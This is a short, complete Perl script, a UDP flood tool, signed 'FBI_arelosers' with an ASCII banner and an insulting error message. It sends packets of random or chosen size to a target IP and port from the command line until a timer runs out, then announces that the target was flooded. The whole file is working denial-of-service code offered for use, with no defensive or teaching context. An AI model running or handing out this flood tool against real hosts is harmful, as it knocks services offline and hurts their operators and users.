#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;


##
# FBI_arelosers
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Thats not a hostname retard $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD GREEN<<EOTEXT;
██████╗  ██████╗  ██████╗ ███████╗
██╔══██╗██╔═══██╗██╔════╝ ██╔════╝
██║  ██║██║   ██║██║  ███╗█████╗  
██║  ██║██║   ██║██║   ██║██╔══╝  
██████╔╝╚██████╔╝╚██████╔╝███████╗
╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝
           Made by FBI_arelosers                       



	Wow, very offline, many packets. $ip waz hit with UDP flood attack
	For $time Seconds using port $port 
EOTEXT


 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","attack"), 0, pack_sockaddr_in($pport,
$iaddr));}